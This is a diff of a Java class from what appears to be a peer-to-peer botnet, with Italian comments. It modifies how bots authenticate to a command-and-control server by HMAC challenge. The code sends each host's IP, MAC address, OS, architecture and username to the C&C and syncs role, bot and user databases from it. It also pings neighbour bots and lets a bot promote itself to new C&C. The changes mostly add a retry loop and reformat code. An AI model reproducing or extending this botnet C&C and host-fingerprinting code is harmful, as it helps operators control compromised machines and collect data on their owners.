@@ -117,21 +117,25 @@ public class Behavior {
 	 * @return true if the challenges goes well
 	 */
 	private boolean challengeToCommandConquer() {
-		System.out.println("Richiesta challenge a C&C " + nServ.getCommandConquerIps().get(0).getValue1());
-		Pairs<Long, Integer> challenge = req.getChallengeFromCeC(nServ.getIdHash(),
-				nServ.getCommandConquerIps().get(0).getValue1());
-		if (challenge != null) {
-			String key = auth.generateStringKey(challenge.getValue2());
-			String hashMac = auth.generateHmac(challenge.getValue1(), auth.generateSecretKey(key));
-			System.out.println(hashMac);
-			String response = req.getResponseFromCeC(nServ.getIdHash(), nServ.getMyIp(), nServ.getMac(), nServ.getOs(),
-					nServ.getVersionOS(), nServ.getArchOS(), nServ.getUsernameOS(),
-					nServ.getCommandConquerIps().get(0).getValue1(), hashMac, pki.getPubRSAKey(), nServ.isElegible());
-			System.out.println("La risposta del C&C: " + response);
-			return true;
-		} else {
-			return false;
+		Boolean flag = true;
+		while (flag) {
+			System.out.println("Richiesta challenge a C&C " + nServ.getCommandConquerIps().get(0).getValue1());
+			Pairs<Long, Integer> challenge = req.getChallengeFromCeC(nServ.getIdHash(),
+					nServ.getCommandConquerIps().get(0).getValue1());
+			if (challenge != null) {
+				String key = auth.generateStringKey(challenge.getValue2());
+				String hashMac = auth.generateHmac(challenge.getValue1(), auth.generateSecretKey(key));
+				System.out.println(hashMac);
+				String response = req.getResponseFromCeC(nServ.getIdHash(), nServ.getMyIp(), nServ.getMac(),
+						nServ.getOs(), nServ.getVersionOS(), nServ.getArchOS(), nServ.getUsernameOS(),
+						nServ.getCommandConquerIps().get(0).getValue1(), hashMac, pki.getPubRSAKey(),
+						nServ.isElegible());
+				System.out.println("La risposta del C&C: " + response);
+				flag = false;
+				return true;
+			}
 		}
+		return false;
 	}
 
 	// verify bot
@@ -288,6 +292,8 @@ public class Behavior {
 
 	public Pairs<Long, Integer> authReqBot(String idBot) {
 		System.out.println(" inizio authreqbot");
+		if (auth.getNeighSeed().indexOfValue1(idBot) >= 0)
+			return auth.getNeighSeed().getByValue1(idBot).getValue2();
 		Long keyNumber = new Long(auth.generateNumberText());
 		Integer iterationNumber = new Integer(auth.generateIterationNumber());
 		System.out.println("keyNumber " + keyNumber);
@@ -307,27 +313,25 @@ public class Behavior {
 	public Boolean checkHmacBot(ArrayList<Object> objects) {
 		Boolean response = false;
 		System.out.println(" inizio check");
-
 		SyncIpList<String, Pairs<Long, Integer>> lista = auth.getNeighSeed();
+		System.out.println("size lista hmac vicini " + lista.getSize());
 		String idBot = objects.get(0).toString();
-		System.out.println("Id bot ricevuto" + idBot);
 		String hashMac = objects.get(1).toString();
 		if (lista != null && lista.getSize() > 0) {
-			Pairs<String, Pairs<Long, Integer>> buff = lista.getByValue1(idBot);
+			Pairs<String, Pairs<Long, Integer>> buff = lista.removeByValue1(idBot);
 			if (buff != null) {
 				Pairs<Long, Integer> coppia = buff.getValue2();
 				Long keyNumber = coppia.getValue1();
 				Integer iterationNumber = coppia.getValue2();
-				System.out.println("keyNumber " + keyNumber);
-				System.out.println("IterationNumber " + iterationNumber);
-				System.out.println("idbot " + idBot);
 				if (coppia != null) {
-					if (lista.indexOfValue1(idBot) >= 0) {
-						if (auth.validateHmac(keyNumber, iterationNumber, hashMac)) {
-							response = true;
-							objects.forEach(obj -> System.out.println("obj: " + obj.toString()));
-							// aggiungere a vicini
-						}
+					System.out.println("keyNumber " + keyNumber);
+					System.out.println("IterationNumber " + iterationNumber);
+					System.out.println("idbot " + idBot);
+
+					if (auth.validateHmac(keyNumber, iterationNumber, hashMac)) {
+						response = true;
+						objects.forEach(obj -> System.out.println("obj: " + obj.toString()));
+						// aggiungere a vicini
 					}
 				}
 			} else
@@ -376,7 +380,7 @@ public class Behavior {
 							if (resp != null) {
 								System.out.println("resp " + resp.getValue1());
 								String key = auth.generateStringKey(resp.getValue2());
-								System.out.println("key "+ key);
+								System.out.println("key " + key);
 								String hashMac = auth.generateHmac(resp.getValue1(), auth.generateSecretKey(key));
 								System.out.println("keyNumber " + resp.getValue1());
 								System.out.println("IterationNumber " + resp.getValue2());
@@ -384,7 +388,7 @@ public class Behavior {
 								Boolean b = false;
 								b = req.getResponseFromBot(nServ.getIdHash(), dest, hashMac, pki.getPubRSAKey());
 								if (b != null && b) {
-									
+
 									System.out.println("botSize " + botResp.getSize());
 								} else {
 									System.out.println("challenge vicini  hmac null o false" + b);
@@ -429,25 +433,25 @@ public class Behavior {
 		System.out.println("Importo Database dal C&C");
 		// richiesta ruoli
 		List<Role> roles = req.getRoles(ip, myId);
-		if(roles!=null){
-		Collections.sort(roles, (a, b) -> a.getId() < b.getId() ? -1 : a.getId() == b.getId() ? 0 : 1);
-		roles.forEach(role -> System.out.println("Ruolo: " + role));
-		rServ.saveAll(roles);
+		if (roles != null) {
+			Collections.sort(roles, (a, b) -> a.getId() < b.getId() ? -1 : a.getId() == b.getId() ? 0 : 1);
+			roles.forEach(role -> System.out.println("Ruolo: " + role));
+			rServ.saveAll(roles);
 		}
 		// richiesta bots
 		List<Bot> bots = req.getBots(ip, myId);
-		if(bots!=null){
-		Collections.sort(bots, (a, b) -> a.getId() < b.getId() ? -1 : a.getId() == b.getId() ? 0 : 1);
-		bots.forEach(bot -> System.out.println("Bot: " + bot));
-		bServ.saveAll(bots);
+		if (bots != null) {
+			Collections.sort(bots, (a, b) -> a.getId() < b.getId() ? -1 : a.getId() == b.getId() ? 0 : 1);
+			bots.forEach(bot -> System.out.println("Bot: " + bot));
+			bServ.saveAll(bots);
 		}
-		
+
 		// richiesta users
 		List<User> users = req.getUser(ip, myId);
-		if(users!=null){
-		Collections.sort(users, (a, b) -> a.getId() < b.getId() ? -1 : a.getId() == b.getId() ? 0 : 1);
-		users.forEach(user -> System.out.println("Utenti: " + user));
-		uServ.saveAll(users);
+		if (users != null) {
+			Collections.sort(users, (a, b) -> a.getId() < b.getId() ? -1 : a.getId() == b.getId() ? 0 : 1);
+			users.forEach(user -> System.out.println("Utenti: " + user));
+			uServ.saveAll(users);
 		}
 		// prendo grafo
 		List<String> graph = req.getPeers(ip, myId);
@@ -473,47 +477,45 @@ public class Behavior {
 		vertex.forEach(v -> System.out.println("vertex " + v.getIp()));
 		System.out.println("Aggiorno grafo rete P2P con quello del C&C");
 		pServ.updateNetworkP2P(edge, vertex);
-		
+
 		SyncIpList<IP, String> gg = nServ.getAliveBot();
-		
+
 		for (Bot bot : bots) {
-			if(vertex.indexOf(new IP(bot.getIp()))>=0)
-				gg.add(new Pairs<IP,String>(new IP(bot.getIp()),bot.getIdBot()));
+			if (vertex.indexOf(new IP(bot.getIp())) >= 0)
+				gg.add(new Pairs<IP, String>(new IP(bot.getIp()), bot.getIdBot()));
 		}
 
-		
-		
 		// avvisa cec che se ready
 		Boolean b = req.ready(ip, myId);
 		if ((b != null) && (b)) {
 			System.out.println("SONO IL NUOVO C&C");
 			eng.setCommandandconquerStatus(true);
-//			nServ.getCommandConquerIps().remove(0); non lo faccio più perché mi aggiorno con il flood del cec
-//			nServ.getCommandConquerIps().add(new Pairs<IP, PublicKey>( nServ.getMyIp(), pki.getPubRSAKey()));
+			// nServ.getCommandConquerIps().remove(0); non lo faccio più perché
+			// mi aggiorno con il flood del cec
+			// nServ.getCommandConquerIps().add(new Pairs<IP, PublicKey>(
+			// nServ.getMyIp(), pki.getPubRSAKey()));
 			pServ.setNewKing("");
 		}
 		// controllare risposta da cec che ha avvisato dns
 	}
 
-	
-	
-	private void pingToNeighbours(){
+	private void pingToNeighbours() {
 		System.out.println("PING a vicini e vedo se sono vivi");
 		SyncIpList<IP, PublicKey> listNegh = nServ.getNeighbours();
 		SyncIpList<Future<Boolean>, IP> botResp = new SyncIpList<Future<Boolean>, IP>();
-		List<IP> listDeadNegh=new ArrayList<IP>();
-		
+		List<IP> listDeadNegh = new ArrayList<IP>();
+
 		for (int i = 0; i < listNegh.getSize(); i++) {
 			Pairs<IP, PublicKey> pairs = listNegh.get(i);
 			Future<Boolean> result = req.pingToBot(pairs.getValue1().toString());
-			Pairs<Future<Boolean>, IP> element = new Pairs<Future<Boolean>, IP>(result,	pairs.getValue1());
+			Pairs<Future<Boolean>, IP> element = new Pairs<Future<Boolean>, IP>(result, pairs.getValue1());
 			botResp.add(element);
 		}
-		
+
 		while (botResp.getSize() != 0) {
 			for (int i = 0; i < botResp.getSize(); i++) {
 				Pairs<Future<Boolean>, IP> coppia = botResp.get(i);
-				if (coppia.getValue1().isDone()) {					
+				if (coppia.getValue1().isDone()) {
 					botResp.remove(coppia);
 					if (coppia.getValue1() != null) {
 						Boolean response;
@@ -521,10 +523,10 @@ public class Behavior {
 							response = coppia.getValue1().get();
 							IP dest = coppia.getValue2();
 							if (response) {
-								System.out.println("Il vicino "+dest+" è vivo");
+								System.out.println("Il vicino " + dest + " è vivo");
 							} else {
 								listDeadNegh.add(coppia.getValue2());
-								System.out.println("Il vicino "+dest+" è morto");
+								System.out.println("Il vicino " + dest + " è morto");
 							}
 
 						} catch (InterruptedException | ExecutionException e) {
@@ -537,29 +539,30 @@ public class Behavior {
 				}
 			}
 		}
-		if(!listDeadNegh.isEmpty())
-		syncNeightoCec(listDeadNegh);
+		if (!listDeadNegh.isEmpty())
+			syncNeightoCec(listDeadNegh);
 		System.out.println("Fase di PING conclusa");
 	}
-	
-	private void syncNeightoCec(List<IP> listDeadNegh){
-		//invico a cec di mia nuova lista vicini ovvero di chi mi ha risposto		
+
+	private void syncNeightoCec(List<IP> listDeadNegh) {
+		// invico a cec di mia nuova lista vicini ovvero di chi mi ha risposto
 		List<Pairs<IP, PublicKey>> newNeighbours = new ArrayList<Pairs<IP, PublicKey>>();
 		List<Pairs<String, String>> response = null;
-		response=req.sendDeadNeighToCeC(nServ.getCommandConquerIps().get(0).getValue1().toString(), nServ.getIdHash(),listDeadNegh);	
+		response = req.sendDeadNeighToCeC(nServ.getCommandConquerIps().get(0).getValue1().toString(), nServ.getIdHash(),
+				listDeadNegh);
 		newNeighbours = nServ.tramsuteNeigha(response);
 		if (newNeighbours != null) {
 			newNeighbours.forEach(ob -> System.out.println("Vicinato convertito " + ob.getValue1().toString()));
 		} else
 			System.out.println("Risposta vicini senza elementi");
-		
+
 		SyncIpList<IP, PublicKey> buf = nServ.getNeighbours();
 		buf.setAll(newNeighbours);
 		nServ.setNeighbours(buf);// TODO controllare se serve veramente
 		System.out.println("Avviso i mie vicini di conoscerli");
 		challengeToBot();
 	}
-	
+
 	public P2PMan getpServ() {
 		return pServ;
 	}
